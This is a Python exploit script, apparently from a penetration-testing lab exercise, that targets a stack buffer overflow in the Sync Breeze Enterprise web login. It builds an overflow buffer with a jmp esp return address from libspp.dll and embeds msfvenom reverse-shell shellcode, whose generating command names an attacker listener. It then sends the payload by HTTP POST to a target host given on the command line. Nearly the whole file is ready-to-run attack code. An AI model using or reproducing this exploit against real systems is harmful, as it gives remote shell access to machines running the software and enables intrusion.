#!/usr/bin/env python3
import sys
import socket
from struct import pack

OFFSET = 780
BAD_CHARS = b"\x00\x0a\x0d\x25\x26\x2b\x3d"

# msfvenom -p windows/shell_reverse_tcp LHOST=<kali_IP> LPORT=<ncat_port> EXITFUNC=thread -f python -v shellcode -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
shellcode =  b""
shellcode += b"\xda\xc6\xb8\xb9\xf2\xbe\x44\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x52\x31\x47\x17\x03\x47\x17"
shellcode += b"\x83\x7e\xf6\x5c\xb1\x7c\x1f\x22\x3a\x7c\xe0"
shellcode += b"\x43\xb2\x99\xd1\x43\xa0\xea\x42\x74\xa2\xbe"
shellcode += b"\x6e\xff\xe6\x2a\xe4\x8d\x2e\x5d\x4d\x3b\x09"
shellcode += b"\x50\x4e\x10\x69\xf3\xcc\x6b\xbe\xd3\xed\xa3"
shellcode += b"\xb3\x12\x29\xd9\x3e\x46\xe2\x95\xed\x76\x87"
shellcode += b"\xe0\x2d\xfd\xdb\xe5\x35\xe2\xac\x04\x17\xb5"
shellcode += b"\xa7\x5e\xb7\x34\x6b\xeb\xfe\x2e\x68\xd6\x49"
shellcode += b"\xc5\x5a\xac\x4b\x0f\x93\x4d\xe7\x6e\x1b\xbc"
shellcode += b"\xf9\xb7\x9c\x5f\x8c\xc1\xde\xe2\x97\x16\x9c"
shellcode += b"\x38\x1d\x8c\x06\xca\x85\x68\xb6\x1f\x53\xfb"
shellcode += b"\xb4\xd4\x17\xa3\xd8\xeb\xf4\xd8\xe5\x60\xfb"
shellcode += b"\x0e\x6c\x32\xd8\x8a\x34\xe0\x41\x8b\x90\x47"
shellcode += b"\x7d\xcb\x7a\x37\xdb\x80\x97\x2c\x56\xcb\xff"
shellcode += b"\x81\x5b\xf3\xff\x8d\xec\x80\xcd\x12\x47\x0e"
shellcode += b"\x7e\xda\x41\xc9\x81\xf1\x36\x45\x7c\xfa\x46"
shellcode += b"\x4c\xbb\xae\x16\xe6\x6a\xcf\xfc\xf6\x93\x1a"
shellcode += b"\x52\xa6\x3b\xf5\x13\x16\xfc\xa5\xfb\x7c\xf3"
shellcode += b"\x9a\x1c\x7f\xd9\xb2\xb7\x7a\x8a\x7c\xef\xa1"
shellcode += b"\xf9\x15\xf2\xa9\xfc\x5e\x7b\x4f\x94\xb0\x2a"
shellcode += b"\xd8\x01\x28\x77\x92\xb0\xb5\xad\xdf\xf3\x3e"
shellcode += b"\x42\x20\xbd\xb6\x2f\x32\x2a\x37\x7a\x68\xfd"
shellcode += b"\x48\x50\x04\x61\xda\x3f\xd4\xec\xc7\x97\x83"
shellcode += b"\xb9\x36\xee\x41\x54\x60\x58\x77\xa5\xf4\xa3"
shellcode += b"\x33\x72\xc5\x2a\xba\xf7\x71\x09\xac\xc1\x7a"
shellcode += b"\x15\x98\x9d\x2c\xc3\x76\x58\x87\xa5\x20\x32"
shellcode += b"\x74\x6c\xa4\xc3\xb6\xaf\xb2\xcb\x92\x59\x5a"
shellcode += b"\x7d\x4b\x1c\x65\xb2\x1b\xa8\x1e\xae\xbb\x57"
shellcode += b"\xf5\x6a\xdb\xb5\xdf\x86\x74\x60\x8a\x2a\x19"
shellcode += b"\x93\x61\x68\x24\x10\x83\x11\xd3\x08\xe6\x14"
shellcode += b"\x9f\x8e\x1b\x65\xb0\x7a\x1b\xda\xb1\xae"
# ...<snip>...

# !mona jmp -r esp -cpb "\x00"
# The command finds a 9 instances that will jump to ESP
# We need one without a bad character in the address and ASLR: False.
# 0x10090c83 : jmp esp |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)

# Exploit buffer
buf = b"A" * OFFSET
buf += pack("<I", 0x10090c83)   # "jmp esp" in libspp.dll found with mona
buf += b"C" * 4                 # Padding between EIP (780) and ESP contents (788)
buf += b"\x90" * 16             # NOPs for msfvenom payload decoding
buf += shellcode

# Optional safety check the buffer for bad characters
for c in buf:
    if c in BAD_CHARS:
        print(hex(c), 'in', buf[OFFSET:].hex())
        raise Exception("Bad character in buffer!")

body = b"username=" + buf + b"&password=A"

req = b"POST /login HTTP/1.1\r\n"
req += b"Host: 192.168.208.131\r\n"
req += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += b"Accept-Language: en-US,en;q=0.5\r\n"
req += b"Referer: http://192.168.208.131/login\r\n"
req += b"Connection: close\r\n"
req += b"Content-Type: application/x-www-form-urlencoded\r\n"
req += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
req += b"\r\n"
req += body

print('[+] Sending payload...')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 80))
s.send(req)
s.close()
print('[+] Payload sent.')
